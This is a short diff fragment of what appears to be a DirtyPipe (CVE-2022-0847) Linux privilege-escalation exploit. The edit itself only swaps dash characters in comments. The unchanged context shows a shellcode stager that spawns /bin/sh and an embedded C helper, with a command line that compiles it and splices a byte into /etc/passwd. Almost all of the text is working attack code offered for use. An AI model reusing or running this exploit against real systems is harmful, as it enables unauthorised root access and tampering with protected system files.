@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""CVE-2022-0847 — DirtyPipe (Linux 5.8–5.16.11). Post-exploit stager:
+"""CVE-2022-0847 -- DirtyPipe (Linux 5.8--5.16.11). Post-exploit stager:
 x86-64 execve('/bin/sh') shellcode. Run the C helper for the full splice."""
 import sys
 from pathlib import Path
@@ -16,7 +16,7 @@ def build() -> bytes:
         "0f05")                 # syscall
 
 C_STUB = r'''
-/* dirtypipe.c — splice a byte into a read-only file via a pipe.
+/* dirtypipe.c -- splice a byte into a read-only file via a pipe.
  * cc dirtypipe.c -o dirtypipe && ./dirtypipe /etc/passwd 4 1
  * args: <file> <offset> <byte>
  */
